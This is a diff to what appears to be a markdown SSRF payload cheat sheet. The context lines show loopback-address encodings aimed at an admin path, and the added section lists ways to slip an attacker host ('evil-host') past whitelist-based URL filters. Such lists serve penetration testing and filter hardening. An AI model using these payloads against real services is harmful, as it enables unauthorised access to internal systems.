@@ -186,3 +186,11 @@ http://127.1/%2561dmin
 http://2130706433/%2561dmin
 http://017700000001/%2561dmin
 ```
+
+### SSRF with whitelist-based input filters
+```
+1 - https://expected-host:fakepassword@evil-host
+2 - https://evil-host#expected-host
+3 - https://expected-host.evil-host
+4 - URL-encode characters to confuse the URL-parsing code
+```
